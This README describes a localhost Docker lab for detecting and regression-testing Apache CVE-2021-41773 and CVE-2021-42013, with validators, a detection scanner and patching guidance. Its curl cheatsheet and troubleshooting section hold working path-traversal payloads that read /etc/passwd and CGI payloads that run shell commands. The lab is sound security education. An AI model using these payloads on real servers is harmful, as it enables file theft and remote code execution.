# CVE-2021-41773 / CVE-2021-42013 — Detection & Regression Validation Lab

> **Apache HTTP Server Path Traversal & Remote Code Execution**
> Cybersecurity R&D Internship Assignment — Hands-on Vulnerability Research Lab

---

## Table of Contents

1. [Overview](#1-overview)
2. [Prerequisites](#2-prerequisites)
3. [Project Structure](#3-project-structure)
4. [Quick Start](#4-quick-start)
5. [Vulnerability Background](#5-vulnerability-background)
6. [Lab Environment Details](#6-lab-environment-details)
7. [Running the Validation Scripts](#7-running-the-validation-scripts)
8. [Running the Detection Scanner](#8-running-the-detection-scanner)
9. [Expected Results Summary](#9-expected-results-summary)
10. [Remediation & Patching](#10-remediation--patching)
11. [Capturing Evidence](#11-capturing-evidence)
12. [Curl Reproduction Cheatsheet](#12-curl-reproduction-cheatsheet)
13. [Troubleshooting](#13-troubleshooting)
14. [Assumptions & Limitations](#14-assumptions--limitations)
15. [References](#15-references)

---

## 1. Overview

This lab provides a complete, reproducible environment for validating detection
of **CVE-2021-41773** and its bypass **CVE-2021-42013** in Apache HTTP Server.

**What this lab demonstrates:**

| Check | Against Vulnerable (2.4.49) | Against Patched (2.4.51) |
|:------|:--------------------------|:------------------------|
| Path traversal (file read) | ✗ File content returned (HTTP 200) | ✓ Rejected (HTTP 400/403) |
| CGI handler routing | ✗ Command output returned (HTTP 200) | ✓ Rejected (HTTP 400/403) |
| Detection scanner | ✗ VULNERABLE verdict | ✓ PATCHED / SECURE verdict |

**Network isolation guarantee:** All containers bind to `127.0.0.1` only —
never exposed to `0.0.0.0`, your LAN, or the internet.

---

## 2. Prerequisites

| Requirement | Minimum Version | Verify |
|:------------|:----------------|:-------|
| Docker Desktop | 20.10+ | `docker --version` |
| Docker Compose | v2.0+ | `docker compose version` |
| Python | 3.7+ | `python --version` |
| curl | Any | `curl --version` |

**Windows users:** Use PowerShell or Command Prompt. All scripts include
`.bat` equivalents. Enable Docker Desktop and ensure WSL 2 backend is active.

**No pip installs required** — all Python scripts use the standard library only.

---

## 3. Project Structure

```
INE_Assignment/
├── README.md
├── docker-compose.yml                 # Run both containers simultaneously
├── docker-compose.vulnerable.yml      # Run vulnerable container only
├── docker-compose.patched.yml         # Run patched container only
├── .gitignore
├── env/
│   ├── vulnerable/
│   │   ├── Dockerfile                 # httpd:2.4.49 with mod_cgi + permissive config
│   │   └── httpd.conf                 # Vulnerable Apache configuration
│   └── patched/
│       ├── Dockerfile                 # httpd:2.4.51 with hardened config
│       └── httpd.conf                 # Secure Apache configuration
├── data/
│   ├── seed/secret_flag.txt           # Canary token (lab flag) — outside document root
│   └── cgi-bin/test_cgi.sh           # Legitimate baseline CGI script
├── scripts/
│   ├── setup.bat                      # Windows automation (build/start/evidence)
│   ├── setup.sh                       # Linux/macOS automation
│   ├── validate_traversal.py          # Path traversal regression validator
│   ├── validate_cgi_handling.py       # CGI routing regression validator
│   └── detect_cve.py                  # Defensive detection scanner (PASS/FAIL)
├── docs/
│   ├── CVE_RESEARCH_REPORT.md         # Full technical research report
│   └── ARCHITECTURE.md                # Network isolation & component design
└── evidence/                          # Generated at runtime — see Section 11
    ├── vulnerable_server_boot.txt
    ├── validate_traversal_output.txt
    ├── validate_cgi_output.txt
    ├── detection_pre_patch.txt
    ├── patched_server_boot.txt
    ├── validate_post_patch.txt
    └── detection_post_patch.txt
```

---

## 4. Quick Start

```bash
# Clone or navigate to the project directory
cd INE_Assignment

# Step 1: Build Docker images (run once, ~2 min)
docker compose build

# Step 2: Start both containers
docker compose up -d

# Step 3: Verify containers are healthy
docker compose ps
# Expected: two containers, Status "Up", ports 127.0.0.1:8080->80 and :8081->80

# Step 4: Confirm baseline connectivity
curl http://127.0.0.1:8080/           # Should return: Apache 2.4.49 Lab Server
curl http://127.0.0.1:8081/           # Should return: Apache 2.4.51 Lab Server (Patched)

# Step 5: Run the detection scanner
python scripts/detect_cve.py --url http://127.0.0.1:8080   # VULNERABLE
python scripts/detect_cve.py --url http://127.0.0.1:8081   # PATCHED / SECURE

# Step 6: Stop the lab when done
docker compose down
```

**Windows one-liner (automation script):**
```cmd
scripts\setup.bat run-all
```

---

## 5. Vulnerability Background

### CVE-2021-41773 (Apache 2.4.49)

A flaw in `ap_normalize_path()` in `server/util.c` failed to re-evaluate
traversal sequences after decoding percent-encoded characters. The dot character
`.` encoded as `%2e` was decoded internally to `.` but the resulting `..`
segment was not re-checked for directory traversal, allowing escape from the
document root.

**Encoded traversal example:**
```
/icons/.%2e/%2e%2e/%2e%2e/etc/passwd
       ↓ decode
/icons/../../etc/passwd
       ↓ normalize
/etc/passwd   ← outside document root!
```

### CVE-2021-42013 (Apache 2.4.50 — incomplete fix bypass)

The 2.4.50 fix checked for `%2e` specifically but could be bypassed with
double-encoding: `%%32%65` decodes to `%2e` (first pass), then to `.` (second
pass). The single-pass check missed this variant.

### Why it matters

- **CVSS: 9.8 Critical** — no authentication, no user interaction
- Exploitable with a single HTTP request
- Mass exploitation began within hours of public disclosure
- Both file read (CWE-22) and RCE via mod_cgi (CWE-94) vectors
- Fully fixed in Apache 2.4.51

For full technical details see [`docs/CVE_RESEARCH_REPORT.md`](docs/CVE_RESEARCH_REPORT.md).

---

## 6. Lab Environment Details

### Vulnerable Container (Apache 2.4.49)

| Property | Value |
|:---------|:------|
| Image | `httpd:2.4.49` (official Docker Hub) |
| Host endpoint | `http://127.0.0.1:8080` |
| mod_cgi | Loaded (`LoadModule cgi_module`) |
| `<Directory />` | `Require all granted` |
| ServerTokens | Full (reveals version in `Server:` header) |
| Canary file | `/var/secret/confidential_token.txt` |

### Patched Container (Apache 2.4.51)

| Property | Value |
|:---------|:------|
| Image | `httpd:2.4.51` (official Docker Hub) |
| Host endpoint | `http://127.0.0.1:8081` |
| mod_cgi | Not loaded |
| `<Directory />` | `Require all denied` |
| ServerTokens | Prod (version suppressed) |
| Canary file | Present but unreachable via traversal |

---

## 7. Running the Validation Scripts

### 7.1 Path Traversal Validator (`validate_traversal.py`)

Tests whether the server discloses files outside the document root.

```bash
# Test /etc/passwd traversal — CVE-2021-41773 and 42013 patterns
python scripts/validate_traversal.py --url http://127.0.0.1:8080

# Test reading the canary token (lab flag)
python scripts/validate_traversal.py --url http://127.0.0.1:8080 \
    --file /var/secret/confidential_token.txt

# Test only the CVE-2021-41773 pattern
python scripts/validate_traversal.py --url http://127.0.0.1:8080 --mode 41773

# Confirm patched server rejects the same requests
python scripts/validate_traversal.py --url http://127.0.0.1:8081
```

**Options:**

| Flag | Default | Description |
|:-----|:--------|:------------|
| `--url` | `http://127.0.0.1:8080` | Target server URL |
| `--file` | `/etc/passwd` | Remote file path to attempt reading |
| `--mode` | `both` | `41773`, `42013`, or `both` |
| `--timeout` | `10` | Seconds before request times out |
| `--verbose` | off | Print full response headers |

### 7.2 CGI Handler Validator (`validate_cgi_handling.py`)

Tests whether the CGI routing path via traversal executes commands.

```bash
# Default: run "id" via CGI traversal path
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8080

# Run multiple commands
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8080 \
    --cmd "id; uname -a; whoami"

# Read the canary flag via CGI
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8080 \
    --cmd "cat /var/secret/confidential_token.txt"

# Confirm patched server blocks CGI routing
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8081 --cmd "id"
```

**Options:**

| Flag | Default | Description |
|:-----|:--------|:------------|
| `--url` | `http://127.0.0.1:8080` | Target server URL |
| `--cmd` | `id` | Shell command to run |
| `--mode` | `both` | `41773`, `42013`, or `both` |
| `--timeout` | `15` | Seconds before request times out |
| `--verbose` | off | Print full response headers |

---

## 8. Running the Detection Scanner

`detect_cve.py` is the primary defensive tool. It runs two checks:

1. **Phase 1 — Passive banner check:** reads the `Server:` header
2. **Phase 2 — Active non-destructive probe:** sends a traversal request
   targeting `/etc/issue` (a non-sensitive OS identification file)

```bash
# Scan the vulnerable container
python scripts/detect_cve.py --url http://127.0.0.1:8080

# Scan the patched container
python scripts/detect_cve.py --url http://127.0.0.1:8081

# Save JSON report
python scripts/detect_cve.py --url http://127.0.0.1:8080 \
    --output evidence/detection_pre_patch.json

# Verbose output (show full response headers)
python scripts/detect_cve.py --url http://127.0.0.1:8080 --verbose
```

**Exit codes for CI/CD integration:**
- `0` → PATCHED / SECURE
- `1` → VULNERABLE
- `2` → Error (connection refused, network failure)

---

## 9. Expected Results Summary

### Against Vulnerable Container (`http://127.0.0.1:8080`)

```
validate_traversal.py   → HTTP 200, file content returned
                          FINAL VERDICT: ✗ VULNERABLE

validate_cgi_handling.py → HTTP 200, command output returned
                           FINAL VERDICT: ✗ VULNERABLE — CGI routing confirmed

detect_cve.py           → Server: Apache/2.4.49 (flagged by banner)
                          Phase 2 probe: HTTP 200 (traversal succeeded)
                          FINAL VERDICT: ✗ VULNERABLE
```

### Against Patched Container (`http://127.0.0.1:8081`)

```
validate_traversal.py   → HTTP 400 Bad Request (traversal path rejected)
                          FINAL VERDICT: ✓ PATCHED / SECURE

validate_cgi_handling.py → HTTP 400 Bad Request
                           FINAL VERDICT: ✓ PATCHED / SECURE

detect_cve.py           → Server: Apache (version suppressed)
                          Phase 2 probe: HTTP 400 (traversal rejected)
                          FINAL VERDICT: ✓ PATCHED / SECURE
```

---

## 10. Remediation & Patching

### Primary Fix: Upgrade Apache

Upgrade to Apache HTTP Server **2.4.51 or higher**. This is the only complete
fix for both CVE-2021-41773 and CVE-2021-42013.

```bash
# Ubuntu / Debian
sudo apt update && sudo apt install --only-upgrade apache2
apache2 -v   # Verify: Server version: Apache/2.4.5x

# RHEL / CentOS / Rocky Linux
sudo yum update httpd
httpd -v

# Docker: change image tag in your Dockerfile
# FROM httpd:2.4.49   <-- remove this
# FROM httpd:2.4.51   <-- use this (or httpd:latest)
```

The lab demonstrates this: the patched container uses `httpd:2.4.51` and the
same traversal requests are rejected with HTTP 400.

### Defence-in-Depth (apply regardless of version)

```apache
# httpd.conf — secure baseline settings

# 1. Default-deny all filesystem access
<Directory />
    Require all denied
    Options None
    AllowOverride None
</Directory>

# 2. Grant access only to the document root
<Directory "/var/www/html">
    Require all granted
</Directory>

# 3. Suppress version from Server header
ServerTokens Prod
ServerSignature Off

# 4. Disable CGI if not needed (comment these out):
# LoadModule cgi_module modules/mod_cgi.so
# LoadModule cgid_module modules/mod_cgid.so
```

---

## 11. Capturing Evidence

**Automated (recommended):**

```bash
# Windows
scripts\setup.bat evidence

# Linux / macOS
./scripts/setup.sh evidence
```

This starts both containers, runs all validators, and saves output to `evidence/`.

**Manual capture (step by step):**

```bash
# Start containers
docker compose up -d

# Boot logs
docker compose logs apache-vulnerable > evidence/vulnerable_server_boot.txt
docker compose logs apache-patched    > evidence/patched_server_boot.txt

# Traversal validation (vulnerable)
python scripts/validate_traversal.py --url http://127.0.0.1:8080 \
    | tee evidence/validate_traversal_output.txt

# CGI validation (vulnerable)
python scripts/validate_cgi_handling.py --url http://127.0.0.1:8080 \
    --cmd "id; uname -a; whoami" \
    | tee evidence/validate_cgi_output.txt

# Detection (pre-patch)
python scripts/detect_cve.py --url http://127.0.0.1:8080 \
    | tee evidence/detection_pre_patch.txt

# Post-patch validation
python scripts/validate_traversal.py --url http://127.0.0.1:8081 \
    | tee evidence/validate_post_patch.txt

# Detection (post-patch)
python scripts/detect_cve.py --url http://127.0.0.1:8081 \
    | tee evidence/detection_post_patch.txt
```

Evidence files are in `evidence/`. Store screenshots manually under the same
directory.

---

## 12. Curl Reproduction Cheatsheet

> **Windows note:** Windows `curl.exe` may re-encode `%` sequences. Use
> `--path-as-is` and surround URLs in double quotes.

### Path Traversal — Read `/etc/passwd`

```bash
# CVE-2021-41773 payload (single-encoded)
curl --path-as-is "http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/etc/passwd"

# CVE-2021-42013 payload (double-encoded)
curl --path-as-is "http://127.0.0.1:8080/icons/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# Read the canary token
curl --path-as-is "http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/var/secret/confidential_token.txt"
```

### CGI Handler Routing (RCE)

```bash
# CVE-2021-41773 — run "id"
curl --path-as-is -X POST \
     "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/bin/sh" \
     -d "echo; id"

# CVE-2021-42013 — double-encoded bypass
curl --path-as-is -X POST \
     "http://127.0.0.1:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
     -d "echo; id"

# Read canary flag via CGI
curl --path-as-is -X POST \
     "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/bin/sh" \
     -d "echo; cat /var/secret/confidential_token.txt"
```

### Against Patched Server (should return 400)

```bash
curl -v --path-as-is "http://127.0.0.1:8081/icons/.%2e/%2e%2e/%2e%2e/etc/passwd"
# Expected: < HTTP/1.1 400 Bad Request
```

---

## 13. Troubleshooting

### Container fails to start

```bash
docker compose logs apache-vulnerable
# Common causes:
# - Port 8080/8081 already in use → change host port in docker-compose.yml
# - Docker daemon not running → start Docker Desktop
```

### HTTP 403 Forbidden instead of 200

The traversal is working (path resolved) but the Directory ACL is blocking it.
Check that `env/vulnerable/httpd.conf` has `Require all granted` under `<Directory />`.
Rebuild the image if you changed the config:
```bash
docker compose build --no-cache && docker compose up -d
```

### HTTP 404 on traversal paths

The `/icons/` alias may not be defined. The vulnerable httpd image includes
it by default. If it is missing, use `/cgi-bin/` as the traversal base instead:
```bash
python scripts/validate_traversal.py --url http://127.0.0.1:8080
# The script tries /icons/ first; check script output for fallback paths
```

### curl on Windows encodes `%` to `%25`

Use `--path-as-is` and quote the URL. Alternatively use the Python scripts
which use `http.client` directly and do not re-encode the path.

### CGI returns HTTP 500 (Internal Server Error)

This usually means the `echo;` prefix is missing or the shell is interpreting
input unexpectedly. Try:
```bash
curl --path-as-is -X POST \
     "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/bin/sh" \
     --data-binary "echo; id"
```

### detect_cve.py exits with code 2

The target is not reachable. Check that containers are running:
```bash
docker compose ps
docker compose up -d
```

---

## 14. Assumptions & Limitations

| Item | Detail |
|:-----|:-------|
| **Directory config** | Lab uses `Require all granted` on `<Directory />` to model real-world misconfigurations. Default Apache would return 403, making file read impossible even with traversal working. |
| **mod_cgi requirement** | The CGI vector requires `mod_cgi` to be loaded. Not all 2.4.49 deployments had this enabled — but many did, especially shared hosting setups. |
| **Docker image authenticity** | `httpd:2.4.49` from Docker Hub is the officially published vulnerable binary. No source compilation needed. |
| **Windows curl** | Windows `curl.exe` normalises `%%` sequences. Use `--path-as-is` or the Python scripts. |
| **Canary flag** | The `FLAG{...}` value is synthetic lab data — not a real secret. |

---

## 15. References

| Resource | URL |
|:---------|:----|
| Apache Security Advisory | https://httpd.apache.org/security/vulnerabilities_24.html |
| NVD CVE-2021-41773 | https://nvd.nist.gov/vuln/detail/CVE-2021-41773 |
| NVD CVE-2021-42013 | https://nvd.nist.gov/vuln/detail/CVE-2021-42013 |
| CISA Alert AA21-281A | https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-281a |
| Apache httpd GitHub | https://github.com/apache/httpd |
| CVE Research Report | [docs/CVE_RESEARCH_REPORT.md](docs/CVE_RESEARCH_REPORT.md) |
| Architecture Docs | [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) |

---

*Lab developed for Cybersecurity R&D internship assignment. All containers are
isolated to localhost. No real credentials or sensitive data are used.*
